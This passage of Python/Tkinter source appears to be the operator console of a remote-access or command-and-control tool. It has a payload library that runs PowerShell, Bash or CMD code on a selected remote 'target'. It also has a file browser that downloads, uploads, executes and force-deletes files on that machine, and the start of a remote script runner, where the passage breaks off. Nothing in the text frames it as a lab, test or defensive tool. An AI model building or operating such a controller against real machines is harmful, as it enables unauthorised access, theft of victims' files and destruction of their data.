                  command=self._pc_run_now).pack(fill=tk.X, padx=12, pady=(0, 4))

        tk.Frame(right, bg=T["BG4"], height=1).pack(fill=tk.X, padx=12, pady=8)

        # forward-to-tasks bulk section
        tk.Label(right, text="Forward library\npayload to task:",
                 bg=T["BG"], fg=T["FG_DIM"], font=("Segoe UI", 8),
                 justify="left").pack(anchor="w", padx=12)
        tk.Button(right, text="  send selected\n     Task tab",
                  bg=T["BG3"], fg=T["FG"], font=("Segoe UI", 8), relief="flat",
                  padx=8, pady=6, cursor="hand2", justify="left",
                  command=self._pc_send_to_task).pack(fill=tk.X, padx=12, pady=(4, 2))

        tk.Frame(right, bg=T["BG4"], height=1).pack(fill=tk.X, padx=12, pady=10)

        self._pc_status = tk.Label(right, text="", bg=T["BG"], fg=T["FG_DIM"],
                                   font=("Segoe UI", 8), wraplength=170, justify="left")
        self._pc_status.pack(anchor="w", padx=12)

        # output panel
        out_hdr = tk.Frame(right, bg=T["BG2"], height=24)
        out_hdr.pack(fill=tk.X, side=tk.BOTTOM)
        out_hdr.pack_propagate(False)
        tk.Label(out_hdr, text="Output", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 9, "bold")).pack(side=tk.LEFT, padx=8, pady=3)
        tk.Button(out_hdr, text="clear", bg=T["BG2"], fg=T["FG_DIM"],
                  font=("Segoe UI", 7), relief="flat", cursor="hand2",
                  command=lambda: self._clear_text(self._pc_out)
                  ).pack(side=tk.RIGHT, padx=4, pady=2)
        self._pc_out = scrolledtext.ScrolledText(
            right, bg=T["BG"], fg=T["FG"], font=FONT_MON,
            state="disabled", wrap=tk.WORD, relief="flat", borderwidth=0,
            height=10, insertbackground=T["ACCENT"])
        self._pc_out.pack(fill=tk.BOTH, expand=True, side=tk.BOTTOM)

    #  payload center helpers 

    def _pc_refresh_target(self):
        T = THEME
        if self.selected_cid is None:
            self._pc_target_lbl.configure(text="none selected", fg=T["RED"])
        else:
            info  = clients.get(self.selected_cid, {})
            label = info.get("label", f"id={self.selected_cid}")
            user_ = info.get("user", "")
            tag   = f"id={self.selected_cid}  {label}"
            if user_: tag += f"  user={user_}"
            self._pc_target_lbl.configure(text=tag, fg=T["GREEN"])

    def _pc_refresh_list(self):
        q = self._pc_filter_var.get().lower().strip()
        self._pc_lb.delete(0, tk.END)
        self._pc_filtered_indices = []
        for i, p in enumerate(_payload_library):
            haystack = f"{p.get('name','')} {p.get('shell','')} {p.get('tags','')}".lower()
            if q and q not in haystack:
                continue
            badge = f"[{p.get('shell','?')}]"
            tags  = p.get("tags", "").strip()
            line  = f"{badge}  {p.get('name', 'unnamed')}"
            if tags: line += f"  · {tags}"
            self._pc_lb.insert(tk.END, line)
            self._pc_filtered_indices.append(i)

    def _pc_lb_select(self, event=None):
        sel = self._pc_lb.curselection()
        if not sel: return
        idx = self._pc_filtered_indices[sel[0]]
        p   = _payload_library[idx]
        # populate metadata fields
        self._pc_name_var.set(p.get("name", ""))
        self._pc_tags_var.set(p.get("tags", ""))
        self._pc_shell_var.set(p.get("shell", "powershell"))
        # populate editor
        self._pc_editor.delete("1.0", tk.END)
        self._pc_editor.insert("1.0", p.get("code", ""))

    def _pc_load_to_editor(self):
        # double-click = same as single-select (already wired)
        self._pc_lb_select()

    def _pc_save_to_library(self):
        name = self._pc_name_var.get().strip()
        if not name:
            self._pc_status.configure(text="give the payload a name first", fg=THEME["RED"])
            return
        code = self._pc_editor.get("1.0", tk.END).strip()
        if not code:
            self._pc_status.configure(text="editor is empty", fg=THEME["RED"])
            return
        entry = {
            "name":  name,
            "shell": self._pc_shell_var.get(),
            "tags":  self._pc_tags_var.get().strip(),
            "code":  code,
        }
        # update existing or append
        for i, p in enumerate(_payload_library):
            if p.get("name", "") == name:
                _payload_library[i] = entry
                _pc_save()
                self._pc_refresh_list()
                self._pc_status.configure(text=f"updated: {name}", fg=THEME["GREEN"])
                return
        _payload_library.append(entry)
        _pc_save()
        self._pc_refresh_list()
        self._pc_status.configure(text=f"saved: {name}", fg=THEME["GREEN"])
        self.log(f"[payload center] saved '{name}'")

    def _pc_delete_selected(self):
        sel = self._pc_lb.curselection()
        if not sel: return
        idx = self._pc_filtered_indices[sel[0]]
        name = _payload_library[idx].get("name", "?")
        if not messagebox.askyesno("delete payload", f"Remove '{name}' from library?"):
            return
        del _payload_library[idx]
        _pc_save()
        self._pc_refresh_list()
        self._pc_editor.delete("1.0", tk.END)
        self._pc_name_var.set("")
        self._pc_tags_var.set("")
        self._pc_status.configure(text=f"deleted: {name}", fg=THEME["FG_DIM"])
        self.log(f"[payload center] deleted '{name}'")

    def _pc_delete_all(self):
        if not _payload_library:
            self._pc_status.configure(text="library is already empty", fg=THEME["FG_DIM"])
            return
        count = len(_payload_library)
        if not messagebox.askyesno(
                "delete all payloads",
                f"Remove ALL {count} payload(s) from the library?\nThis cannot be undone."):
            return
        _payload_library.clear()
        _pc_save()
        self._pc_refresh_list()
        self._pc_editor.delete("1.0", tk.END)
        self._pc_name_var.set("")
        self._pc_tags_var.set("")
        self._pc_status.configure(text=f"library cleared ({count} removed)", fg=THEME["FG_DIM"])
        self.log(f"[payload center] deleted all {count} payload(s)")

    def _pc_type_command(self):
        T = THEME
        dlg = tk.Toplevel(self)
        dlg.title("Type Command")
        dlg.configure(bg=T["BG2"])
        dlg.resizable(True, True)
        dlg.geometry("560x320")
        dlg.grab_set()

        # header
        hdr = tk.Frame(dlg, bg=T["BG2"], height=30)
        hdr.pack(fill=tk.X); hdr.pack_propagate(False)
        tk.Label(hdr, text="Type your command:", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 10, "bold")).pack(side=tk.LEFT, padx=12, pady=6)

        # shell selector
        sh_row = tk.Frame(dlg, bg=T["BG2"], height=28)
        sh_row.pack(fill=tk.X); sh_row.pack_propagate(False)
        tk.Label(sh_row, text="Shell:", bg=T["BG2"], fg=T["FG_DIM"],
                 font=FONT).pack(side=tk.LEFT, padx=(12, 6), pady=4)
        dlg_shell_var = tk.StringVar(value=self._pc_shell_var.get())
        for v, lbl_t in (("powershell", "PowerShell"), ("bash", "Bash"), ("cmd", "CMD")):
            tk.Radiobutton(sh_row, text=lbl_t, variable=dlg_shell_var, value=v,
                           bg=T["BG2"], fg=T["FG"], selectcolor=T["BG3"],
                           activebackground=T["BG2"], activeforeground=T["ACCENT"],
                           font=FONT, bd=0, highlightthickness=0, indicatoron=0,
                           padx=8, pady=2, relief="flat", cursor="hand2"
                           ).pack(side=tk.LEFT, padx=2)

        tk.Frame(dlg, bg=T["BG4"], height=1).pack(fill=tk.X, padx=10, pady=(2, 0))

        # text input area
        txt = tk.Text(dlg, bg=T["BG3"], fg=T["FG"], font=FONT_MON,
                      insertbackground=T["ACCENT"], selectbackground=T["BG4"],
                      selectforeground=T["ACCENT"], relief="flat", borderwidth=0,
                      highlightbackground=T["BG4"], highlightthickness=1,
                      wrap=tk.NONE, undo=True)
        txt.pack(fill=tk.BOTH, expand=True, padx=10, pady=8)
        txt.focus_set()

        # button row
        btn_row = tk.Frame(dlg, bg=T["BG2"], height=42)
        btn_row.pack(fill=tk.X); btn_row.pack_propagate(False)

        def _load_to_editor():
            cmd = txt.get("1.0", tk.END).strip()
            if not cmd:
                return
            self._pc_shell_var.set(dlg_shell_var.get())
            self._pc_editor.delete("1.0", tk.END)
            self._pc_editor.insert("1.0", cmd)
            self._pc_status.configure(text="command loaded to editor", fg=THEME["ACCENT"])
            dlg.destroy()

        def _run_now():
            cmd = txt.get("1.0", tk.END).strip()
            if not cmd:
                return
            self._pc_shell_var.set(dlg_shell_var.get())
            self._pc_editor.delete("1.0", tk.END)
            self._pc_editor.insert("1.0", cmd)
            dlg.destroy()
            self._pc_run_now()

        def _on_ctrl_enter(event):
            _run_now()

        txt.bind("<Control-Return>", _on_ctrl_enter)

        tk.Button(btn_row, text="load to editor",
                  bg=T["BG3"], fg=T["FG"], font=FONT, relief="flat",
                  padx=12, pady=6, cursor="hand2",
                  command=_load_to_editor).pack(side=tk.LEFT, padx=(12, 4), pady=6)
        tk.Button(btn_row, text="run on target  (Ctrl+Enter)",
                  bg=T["ACCENT"], fg=T["HDR_FG"],
                  font=("Segoe UI", 10, "bold"), relief="flat",
                  padx=12, pady=6, cursor="hand2",
                  command=_run_now).pack(side=tk.LEFT, padx=(0, 4), pady=6)
        tk.Button(btn_row, text="cancel",
                  bg=T["BG3"], fg=T["FG_DIM"], font=("Segoe UI", 8), relief="flat",
                  padx=8, cursor="hand2",
                  command=dlg.destroy).pack(side=tk.RIGHT, padx=12, pady=6)

    def _pc_import_file(self):
        path = filedialog.askopenfilename(
            title="Import payload from file",
            filetypes=[
                ("Scripts / payloads", "*.ps1 *.sh *.bat *.cmd *.txt *.py *.rb *.lua"),
                ("All files", "*.*"),
            ])
        if not path: return
        try:
            with open(path, "r", encoding="utf-8", errors="replace") as fh:
                src = fh.read()
        except Exception as e:
            self._pc_status.configure(text=f"read error: {e}", fg=THEME["RED"])
            return
        self._pc_editor.delete("1.0", tk.END)
        self._pc_editor.insert("1.0", src)
        # auto-detect shell from extension
        ext = os.path.splitext(path)[1].lower()
        shell_map = {".ps1": "powershell", ".sh": "bash", ".bat": "cmd", ".cmd": "cmd"}
        if ext in shell_map:
            self._pc_shell_var.set(shell_map[ext])
        # auto-fill name from filename
        base = os.path.splitext(os.path.basename(path))[0]
        if not self._pc_name_var.get().strip():
            self._pc_name_var.set(base)
        self._pc_status.configure(
            text=f"imported: {os.path.basename(path)}\n{len(src)} chars", fg=THEME["GREEN"])
        self.log(f"[payload center] imported {path}")

    def _pc_import_folder(self):
        folder = filedialog.askdirectory(title="Import all payloads from folder")
        if not folder:
            return
        _EXT_SHELL_PC = {
            ".ps1": "powershell", ".sh": "bash", ".bat": "cmd", ".cmd": "cmd",
            ".txt": "powershell", ".py": "bash", ".rb": "bash", ".lua": "bash",
        }
        imported = 0
        skipped  = 0
        for root, _dirs, files in os.walk(folder):
            for fname in sorted(files):
                ext = os.path.splitext(fname)[1].lower()
                if ext not in _EXT_SHELL_PC:
                    skipped += 1
                    continue
                fpath = os.path.join(root, fname)
                try:
                    with open(fpath, "r", encoding="utf-8", errors="replace") as fh:
                        src = fh.read().strip()
                except Exception as e:
                    self.log(f"[payload center] folder import skip {fname}: {e}")
                    skipped += 1
                    continue
                if not src:
                    skipped += 1
                    continue
                name  = os.path.splitext(fname)[0]
                shell = _EXT_SHELL_PC[ext]
                entry = {"name": name, "shell": shell, "tags": "", "code": src}
                # update existing or append
                found = False
                for i, p in enumerate(_payload_library):
                    if p.get("name", "") == name:
                        _payload_library[i] = entry
                        found = True
                        break
                if not found:
                    _payload_library.append(entry)
                imported += 1
        if imported:
            _pc_save()
            self._pc_refresh_list()
            self._pc_status.configure(
                text=f"folder import done: {imported} loaded, {skipped} skipped",
                fg=THEME["GREEN"])
            self.log(f"[payload center] folder import: {imported} payloads from {folder}")
        else:
            self._pc_status.configure(
                text=f"no payloads found in folder ({skipped} skipped)",
                fg=THEME["FG_DIM"])

    def _pc_send_to_task(self):
        code  = self._pc_editor.get("1.0", tk.END).strip()
        shell = self._pc_shell_var.get()
        if not code:
            self._pc_status.configure(text="editor is empty", fg=THEME["RED"])
            return
        self._task_load_payload(shell, code)
        self._switch_tab("Task")
        self.log(f"[payload center] forwarded to Task [{shell}]")

    def _pc_run_now(self):
        if self.selected_cid is None:
            self._pc_refresh_target()
            self._pc_status.configure(text="no target selected", fg=THEME["RED"])
            return
        code  = self._pc_editor.get("1.0", tk.END).strip()
        shell = self._pc_shell_var.get()
        if not code:
            self._pc_status.configure(text="editor is empty", fg=THEME["RED"])
            return
        name = self._pc_name_var.get().strip() or "payload"
        ts   = time.strftime("%H:%M:%S")
        self._append(self._pc_out,
                     f"\n[{ts}] >> [{shell}] running '{name}'...\n{code[:200]}\n")
        threading.Thread(target=self._pc_run_worker,
                         args=(clients[self.selected_cid]["sock"], shell, code, name),
                         daemon=True).start()

    def _pc_run_worker(self, sock, shell, code, name):
        tx_b = rx_b = 0
        try:
            payload = json.dumps({"cmd": "shell", "data": {"shell": shell, "cmd": code}}).encode()
            tx_b    = len(payload) + 4
            send_msg(sock, "shell", {"shell": shell, "cmd": code})
            resp = recv_msg(sock)
            if resp: rx_b = len(json.dumps(resp).encode()) + 4
            out  = resp["data"] if resp else "<no response>"
        except Exception as e:
            out = f"<error: {e}>"
        self._append(self._pc_out,
                     f"[{time.strftime('%H:%M:%S')}] << done\n{out}\n{'=' * 60}\n")
        self.log(f"[payload center] '{name}' [{shell}] done")
        if self.selected_cid is not None:
            self._dl_record(self.selected_cid, tx_b, rx_b, f"pc/{shell}: {name[:60]}")
        self.after(0, lambda: self._pc_status.configure(
            text=f"done: {name}", fg=THEME["GREEN"]))

    #  files tab

    def _build_files_tab(self):
        T = THEME
        f = self._make_frame("Files")
        top = tk.Frame(f, bg=T["BG2"], height=36)
        top.pack(fill=tk.X); top.pack_propagate(False)
        tk.Label(top, text="FILE BROWSER", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 10, "bold")).pack(side=tk.LEFT, padx=14, pady=6)
        tk.Label(top, text="TARGET:", bg=T["BG2"], fg=T["FG_DIM"],
                 font=("Segoe UI", 9, "bold")).pack(side=tk.LEFT, padx=(20, 4), pady=6)
        self._fb_target_lbl = tk.Label(top, text="none selected",
                                       bg=T["BG2"], fg=T["ACCENT"],
                                       font=("Segoe UI", 9, "bold"))
        self._fb_target_lbl.pack(side=tk.LEFT, pady=6)
        path_bar = tk.Frame(f, bg=T["BG3"], height=30)
        path_bar.pack(fill=tk.X, padx=0); path_bar.pack_propagate(False)
        tk.Label(path_bar, text="Path:", bg=T["BG3"], fg=T["FG_DIM"],
                 font=FONT).pack(side=tk.LEFT, padx=(10, 4), pady=6)
        self._fb_path_var = tk.StringVar(value="C:\\")
        path_entry = tk.Entry(path_bar, textvariable=self._fb_path_var,
                              bg=T["BG4"], fg=T["FG"], insertbackground=T["ACCENT"],
                              font=FONT_MON, relief="flat", width=60)
        path_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, pady=4, padx=(0, 4))
        path_entry.bind("<Return>", lambda e: self._fb_navigate(self._fb_path_var.get()))
        tk.Button(path_bar, text="GO", bg=T["ACCENT"], fg=T["HDR_FG"],
                  font=("Segoe UI", 9, "bold"), relief="flat", padx=10,
                  cursor="hand2",
                  command=lambda: self._fb_navigate(self._fb_path_var.get())
                  ).pack(side=tk.LEFT, padx=(0, 4), pady=4)
        tk.Button(path_bar, text="↑ UP", bg=T["BG4"], fg=T["FG"],
                  font=FONT, relief="flat", padx=8, cursor="hand2",
                  command=self._fb_up).pack(side=tk.LEFT, padx=(0, 4), pady=4)
        tk.Button(path_bar, text="⟳", bg=T["BG4"], fg=T["FG"],
                  font=FONT, relief="flat", padx=6, cursor="hand2",
                  command=lambda: self._fb_navigate(self._fb_path_var.get())
                  ).pack(side=tk.LEFT, padx=(0, 8), pady=4)
        qnav = tk.Frame(f, bg=T["BG2"], height=28)
        qnav.pack(fill=tk.X); qnav.pack_propagate(False)
        tk.Label(qnav, text="Quick:", bg=T["BG2"], fg=T["FG_DIM"],
                 font=("Segoe UI", 8)).pack(side=tk.LEFT, padx=(10, 4), pady=4)
        for label, path in [
            ("C:\\", "C:\\"), ("Temp", "C:\\Windows\\Temp"), ("Users", "C:\\Users"),
            ("Desktop", "C:\\Users\\Public\\Desktop"), ("AppData", "C:\\Users"),
            ("/tmp", "/tmp"), ("/home", "/home"), ("/", "/"),
        ]:
            tk.Button(qnav, text=label, bg=T["BG3"], fg=T["FG_DIM"],
                      font=("Segoe UI", 8), relief="flat", padx=6, pady=1,
                      cursor="hand2",
                      command=lambda p=path: self._fb_navigate(p)
                      ).pack(side=tk.LEFT, padx=2, pady=4)
        pane = tk.PanedWindow(f, orient=tk.HORIZONTAL, bg=T["BG"],
                              sashwidth=4, sashrelief="flat")
        pane.pack(fill=tk.BOTH, expand=True)
        tree_frame = tk.Frame(pane, bg=T["BG2"])
        pane.add(tree_frame, minsize=400)
        cols = ("name", "type", "size")
        self._fb_tree = ttk.Treeview(tree_frame, columns=cols, show="headings",
                                     selectmode="browse")
        self._fb_tree.heading("name", text="Name",  command=lambda: self._fb_sort("name"))
        self._fb_tree.heading("type", text="Type",  command=lambda: self._fb_sort("type"))
        self._fb_tree.heading("size", text="Size",  command=lambda: self._fb_sort("size"))
        self._fb_tree.column("name", width=320, anchor="w")
        self._fb_tree.column("type", width=70,  anchor="center")
        self._fb_tree.column("size", width=90,  anchor="e")
        fb_vsb = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL,   command=self._fb_tree.yview)
        fb_hsb = ttk.Scrollbar(tree_frame, orient=tk.HORIZONTAL,  command=self._fb_tree.xview)
        self._fb_tree.configure(yscrollcommand=fb_vsb.set, xscrollcommand=fb_hsb.set)
        fb_vsb.pack(side=tk.RIGHT,  fill=tk.Y)
        fb_hsb.pack(side=tk.BOTTOM, fill=tk.X)
        self._fb_tree.pack(fill=tk.BOTH, expand=True)
        self._fb_tree.bind("<Double-Button-1>", self._fb_tree_dbl)
        self._fb_tree.bind("<Return>",          self._fb_tree_dbl)
        act = tk.Frame(pane, bg=T["BG2"])
        pane.add(act, minsize=200, width=240)
        tk.Label(act, text="ACTIONS", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=12, pady=(12, 4))
        tk.Frame(act, bg=T["BG4"], height=1).pack(fill=tk.X, padx=12, pady=4)
        for btn_text, btn_cmd in [
            ("⬇  Download selected", self._fb_download),
            ("⬆  Upload file here",  self._fb_upload),
            ("🗑  Delete selected",   self._fb_delete),
            ("📋  Copy path",         self._fb_copy_path),
        ]:
            tk.Button(act, text=btn_text, bg=T["BG3"], fg=T["FG"],
                      font=FONT, relief="flat", padx=10, pady=5,
                      cursor="hand2", anchor="w",
                      command=btn_cmd).pack(fill=tk.X, padx=12, pady=2)
        tk.Frame(act, bg=T["BG4"], height=1).pack(fill=tk.X, padx=12, pady=8)
        tk.Label(act, text="Run on selected:", bg=T["BG2"], fg=T["FG_DIM"],
                 font=FONT).pack(anchor="w", padx=12)
        for btn_text, cmd_tmpl in [
            ("▶  Execute (cmd)", 'cmd /c "{path}"'),
            ("▶  Execute (PS)",  'powershell -File "{path}"'),
            ("▶  Execute (bash)", 'bash "{path}"'),
        ]:
            def _run_sel(template=cmd_tmpl):
                fp = self._fb_selected_fullpath()
                if not fp: return
                shell = "cmd" if "cmd" in template else ("powershell" if "PS" in template else "bash")
                self._ctx_inject(self.selected_cid, shell, template.format(path=fp))
            tk.Button(act, text=btn_text, bg=T["BG4"], fg=T["FG"],
                      font=FONT, relief="flat", padx=10, pady=5,
                      cursor="hand2", anchor="w",
                      command=_run_sel).pack(fill=tk.X, padx=12, pady=2)
        tk.Frame(act, bg=T["BG4"], height=1).pack(fill=tk.X, padx=12, pady=8)
        self._fb_status = tk.Label(act, text="", bg=T["BG2"], fg=T["FG_DIM"],
                                   font=("Segoe UI", 8), wraplength=200, justify="left")
        self._fb_status.pack(anchor="w", padx=12, pady=4)

    def _fb_refresh_target(self):
        T = THEME
        if self.selected_cid is None:
            self._fb_target_lbl.configure(text="none selected", fg=T["RED"])
        else:
            info  = clients.get(self.selected_cid, {})
            label = info.get("label", f"id={self.selected_cid}")
            self._fb_target_lbl.configure(
                text=f"id={self.selected_cid}  {label}", fg=T["GREEN"])

    def _fb_navigate(self, path):
        if self.selected_cid is None:
            self._fb_status.configure(text="no target selected"); return
        path = path.strip()
        self._fb_path_var.set(path)
        self._fb_status.configure(text=f"listing {path}...")
        sock = clients[self.selected_cid]["sock"]
        threading.Thread(target=self._fb_listdir_worker,
                         args=(sock, path), daemon=True).start()

    def _fb_listdir_worker(self, sock, path):
        try:
            send_msg(sock, "listdir", {"path": path})
            resp = recv_msg(sock)
            if not resp:
                self.after(0, lambda: self._fb_status.configure(text="error: no response"))
                return
            data = resp.get("data")
            if not isinstance(data, dict):
                self.after(0, lambda: self._fb_status.configure(
                    text=f"error: unexpected response ({resp.get('cmd', '?')})"))
                return
            if not data.get("ok"):
                self.after(0, lambda: self._fb_status.configure(
                    text=f"error: {data.get('error', 'unknown')}"))
                return
            self._fb_entries = data.get("entries", [])
            self.after(0, self._fb_populate_tree)
        except Exception as e:
            self.after(0, lambda e=e: self._fb_status.configure(text=f"error: {e}"))

    def _fb_populate_tree(self):
        for row in self._fb_tree.get_children():
            self._fb_tree.delete(row)
        entries = self._fb_entries
        def _key(e):
            if self._fb_sort_key == "name":
                return (not e["is_dir"], e["name"].lower())
            elif self._fb_sort_key == "type":
                return (not e["is_dir"], e["name"].split(".")[-1].lower())
            else:
                return (not e["is_dir"], e["size"])
        entries = sorted(entries, key=_key, reverse=not self._fb_sort_asc)
        for i, e in enumerate(entries):
            icon = "📁" if e["is_dir"] else "📄"
            size = "" if e["is_dir"] else self._fb_fmt_size(e["size"])
            typ  = "DIR" if e["is_dir"] else e["name"].split(".")[-1].upper()[:6]
            self._fb_tree.insert("", tk.END, iid=str(i),
                                 values=(f"{icon} {e['name']}", typ, size),
                                 tags=("dir",) if e["is_dir"] else ("file",))
        self._fb_tree.tag_configure("dir",  foreground=THEME["ACCENT"])
        self._fb_tree.tag_configure("file", foreground=THEME["FG"])
        n_dirs  = sum(1 for e in entries if e["is_dir"])
        n_files = sum(1 for e in entries if not e["is_dir"])
        self._fb_status.configure(
            text=f"{n_dirs} dirs, {n_files} files\n{self._fb_path_var.get()}")

    def _fb_fmt_size(self, b):
        for unit in ("B", "KB", "MB", "GB"):
            if b < 1024: return f"{b:.1f} {unit}"
            b /= 1024
        return f"{b:.1f} TB"

    def _fb_sort(self, key):
        if self._fb_sort_key == key:
            self._fb_sort_asc = not self._fb_sort_asc
        else:
            self._fb_sort_key = key; self._fb_sort_asc = True
        self._fb_populate_tree()

    def _fb_tree_dbl(self, event=None):
        sel = self._fb_tree.selection()
        if not sel: return
        try:
            entry = self._fb_entries[int(sel[0])]
        except (ValueError, IndexError):
            return
        if entry["is_dir"]:
            self._fb_navigate(entry["path"])

    def _fb_up(self):
        cur = self._fb_path_var.get().rstrip("/\\")
        if not cur: return
        if "\\" in cur:
            parent = cur.rsplit("\\", 1)[0] or cur[0:3]
        else:
            parent = cur.rsplit("/", 1)[0] or "/"
        self._fb_navigate(parent)

    def _fb_selected_fullpath(self):
        sel = self._fb_tree.selection()
        if not sel: return None
        try:
            entry = self._fb_entries[int(sel[0])]
            return entry["path"]
        except (ValueError, IndexError, KeyError):
            return None

    def _fb_download(self):
        if self.selected_cid is None:
            self._fb_status.configure(text="no target"); return
        fp = self._fb_selected_fullpath()
        if not fp:
            self._fb_status.configure(text="select a file"); return
        save_to = filedialog.asksaveasfilename(
            initialfile=fp.replace("\\", "/").split("/")[-1])
        if not save_to: return
        self._fb_status.configure(text=f"downloading {fp}...")
        sock = clients[self.selected_cid]["sock"]
        def _worker():
            try:
                send_msg(sock, "download", {"path": fp})
                resp = recv_msg(sock)
                if not resp:
                    self.after(0, lambda: self._fb_status.configure(text="download failed: no response"))
                    return
                payload = resp.get("data")
                if isinstance(payload, dict):
                    if not payload.get("ok"):
                        err = payload.get("error", "unknown error")
                        self.after(0, lambda: self._fb_status.configure(text=f"download failed: {err}"))
                        return
                    b64 = payload.get("data")
                else:
                    b64 = payload
                if not b64:
                    self.after(0, lambda: self._fb_status.configure(text="download failed: empty data"))
                    return
                raw = base64.b64decode(b64)
                with open(save_to, "wb") as fh: fh.write(raw)
                self.after(0, lambda: self._fb_status.configure(
                    text=f"saved {len(raw) / 1024:.1f} KB\n-> {save_to}"))
                self.log(f"[files] downloaded {fp} -> {save_to}")
            except Exception as e:
                self.after(0, lambda: self._fb_status.configure(text=f"error: {e}"))
        threading.Thread(target=_worker, daemon=True).start()

    def _fb_upload(self):
        if self.selected_cid is None:
            self._fb_status.configure(text="no target"); return
        local = filedialog.askopenfilename()
        if not local: return
        fname = os.path.basename(local)
        cur   = self._fb_path_var.get().rstrip("/\\")
        sep   = "\\" if "\\" in cur else "/"
        dest  = cur + sep + fname
        self._fb_status.configure(text=f"uploading -> {dest}...")
        sock = clients[self.selected_cid]["sock"]
        def _worker():
            try:
                with open(local, "rb") as fh: raw = fh.read()
                b64 = base64.b64encode(raw).decode()
                send_msg(sock, "upload", {"path": dest, "data": b64})
                resp = recv_msg(sock)
                result = resp.get("data", "?") if resp else "no response"
                self.after(0, lambda: self._fb_status.configure(text=f"upload: {result}"))
                self.after(0, lambda: self._fb_navigate(cur))
                self.log(f"[files] uploaded {local} -> {dest}: {result}")
            except Exception as e:
                self.after(0, lambda: self._fb_status.configure(text=f"error: {e}"))
        threading.Thread(target=_worker, daemon=True).start()

    def _fb_delete(self):
        if self.selected_cid is None:
            self._fb_status.configure(text="no target")
            return
        sel = self._fb_tree.selection()
        if not sel:
            self._fb_status.configure(text="select a file")
            return
        try:
            entry = self._fb_entries[int(sel[0])]
        except (ValueError, IndexError):
            self._fb_status.configure(text="select a file")
            return

        fp     = entry["path"]
        is_dir = entry["is_dir"]

        if not messagebox.askyesno("delete", f"Delete:\n{fp}"):
            return

        sock   = clients[self.selected_cid]["sock"]
        cur    = self._fb_path_var.get()
        is_win = "\\" in fp or (len(fp) >= 2 and fp[1] == ":")

        if is_win:
            # PowerShell + single-quoted LiteralPath
            # list2cmdline never escapes single quotes, so no quoting hell
            safe_fp = fp.replace("'", "''")   # escape literal ' in path
            if is_dir:
                cmd = f"Remove-Item -LiteralPath '{safe_fp}' -Recurse -Force"
            else:
                cmd = f"Remove-Item -LiteralPath '{safe_fp}' -Force"
            shell = "powershell"
        else:
            cmd   = f"rm -rf {shlex.quote(fp)}"
            shell = "bash"

        self._fb_status.configure(text=f"deleting {fp}...")

        def _worker():
            try:
                send_msg(sock, "shell", {"shell": shell, "cmd": cmd})
                resp = recv_msg(sock)
                out  = (resp.get("data") or "").strip() if resp else "<no response>"
                self.after(0, lambda: self._fb_status.configure(text=f"deleted\n{fp}"))
                self.after(0, lambda: self._fb_navigate(cur))
                self.log(f"[files] delete {fp}  out: {out[:120]}")
            except Exception as e:
                self.after(0, lambda err=e: self._fb_status.configure(text=f"error: {err}"))

        threading.Thread(target=_worker, daemon=True).start()

    def _fb_copy_path(self):
        fp = self._fb_selected_fullpath()
        if not fp: fp = self._fb_path_var.get()
        self.clipboard_clear()
        self.clipboard_append(fp)
        self.update()
        self._fb_status.configure(text=f"copied:\n{fp}")

    #  scripts tab

    def _build_scripts_tab(self):
        T = THEME
        f = self._make_frame("Scripts")
        top = tk.Frame(f, bg=T["BG2"], height=36)
        top.pack(fill=tk.X); top.pack_propagate(False)
        tk.Label(top, text="SCRIPT RUNNER", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 10, "bold")).pack(side=tk.LEFT, padx=14, pady=6)
        tk.Label(top, text="TARGET:", bg=T["BG2"], fg=T["FG_DIM"],
                 font=("Segoe UI", 9, "bold")).pack(side=tk.LEFT, padx=(20, 4), pady=6)
        self._scr_target_lbl = tk.Label(top, text="none selected",
                                        bg=T["BG2"], fg=T["ACCENT"],
                                        font=("Segoe UI", 9, "bold"))
        self._scr_target_lbl.pack(side=tk.LEFT, pady=6)
        ttk.Button(top, text="⟳ Refresh", command=self._scr_refresh
                   ).pack(side=tk.RIGHT, padx=10, pady=5)
        tk.Label(top, text=f"src: {SCRIPT_BASE_DIR}", bg=T["BG2"], fg=T["FG_DIM"],
                 font=("Segoe UI", 7)).pack(side=tk.RIGHT, padx=4)
        outer = tk.PanedWindow(f, orient=tk.HORIZONTAL, bg=T["BG"],
                               sashwidth=4, sashrelief="flat")
        outer.pack(fill=tk.BOTH, expand=True)
        left = tk.Frame(outer, bg=T["BG2"])
        outer.add(left, minsize=160, width=200)
        tk.Label(left, text="FOLDERS", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 9, "bold")).pack(anchor="w", padx=10, pady=(10, 4))
        tk.Frame(left, bg=T["BG4"], height=1).pack(fill=tk.X, padx=10)
        self._scr_folder_lb = tk.Listbox(
            left, bg=T["BG3"], fg=T["FG"], font=FONT_SML,
            selectbackground=T["ACCENT"], selectforeground=T["HDR_FG"],
            relief="flat", borderwidth=0, highlightthickness=0, activestyle="none")
        self._scr_folder_lb.pack(fill=tk.BOTH, expand=True, padx=6, pady=6)
        self._scr_folder_lb.bind("<<ListboxSelect>>", self._scr_folder_select)
        mid = tk.Frame(outer, bg=T["BG2"])
        outer.add(mid, minsize=200, width=280)
        tk.Label(mid, text="SCRIPTS", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 9, "bold")).pack(anchor="w", padx=10, pady=(10, 4))
        tk.Frame(mid, bg=T["BG4"], height=1).pack(fill=tk.X, padx=10)
        fsf = tk.Frame(mid, bg=T["BG2"]); fsf.pack(fill=tk.BOTH, expand=True, padx=6, pady=6)
        file_sb = ttk.Scrollbar(fsf, orient=tk.VERTICAL)
        self._scr_file_lb = tk.Listbox(
            fsf, bg=T["BG3"], fg=T["FG"], font=FONT_SML,
            selectbackground=T["ACCENT"], selectforeground=T["HDR_FG"],
            relief="flat", borderwidth=0, highlightthickness=0, activestyle="none",
            yscrollcommand=file_sb.set)
        file_sb.config(command=self._scr_file_lb.yview)
        self._scr_file_lb.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        file_sb.pack(side=tk.LEFT, fill=tk.Y)
        self._scr_file_lb.bind("<<ListboxSelect>>", self._scr_file_select)
        self._scr_file_lb.bind("<Double-Button-1>", lambda e: self._scr_run())
        self._scr_meta_lbl = tk.Label(mid, text="", bg=T["BG2"], fg=T["FG_DIM"],
                                      font=("Consolas", 8), anchor="w", justify="left")
